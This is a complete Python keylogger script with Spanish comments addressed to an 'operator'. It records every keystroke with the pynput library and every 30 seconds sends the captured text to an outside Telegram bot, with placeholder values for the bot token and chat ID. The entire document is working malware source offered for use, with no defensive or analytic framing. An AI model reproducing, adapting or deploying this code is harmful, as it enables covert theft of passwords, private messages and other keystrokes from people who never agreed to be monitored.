import pynput.keyboard
import requests
import threading

# CONFIGURACIÓN DEL OPERADOR
TOKEN = "TU_TOKEN_DE_TELEGRAM"
CHAT_ID = "TU_CHAT_ID"
LOG_BUFFER = ""

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={message}"
    try:
        requests.get(url)
    except:
        pass

def process_key_press(key):
    global LOG_BUFFER
    try:
        LOG_BUFFER += str(key.char)
    except AttributeError:
        if key == key.space:
            LOG_BUFFER += " "
        else:
            LOG_BUFFER += " [" + str(key) + "] "

def report():
    global LOG_BUFFER
    if LOG_BUFFER:
        send_to_telegram("⌨️ Captura: " + LOG_BUFFER)
        LOG_BUFFER = ""
    # Envía reporte cada 30 segundos
    timer = threading.Timer(30, report)
    timer.start()

keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
    report()
    keyboard_listener.join()
